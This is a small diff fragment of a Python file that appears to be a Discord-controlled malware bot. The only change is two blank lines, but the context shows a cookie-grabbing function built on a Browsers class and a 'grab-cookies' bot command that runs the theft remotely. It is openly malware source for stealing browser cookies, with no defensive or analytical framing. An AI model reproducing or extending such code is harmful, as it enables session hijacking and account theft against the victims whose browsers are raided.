@@ -14,6 +14,7 @@ import subprocess
 #</imports>
 
 #<engine>
+
 def grab_cookies():
     browser = Browsers()
     browser.grab_cookies()
@@ -139,6 +140,7 @@ class Browsers:
 #</engine>
 
 #<command>
+
 @client.command(name="grab-cookies")
 async def grab_cookies(ctx):
     await ctx.send('```Grabbing cookies. Please wait...```')
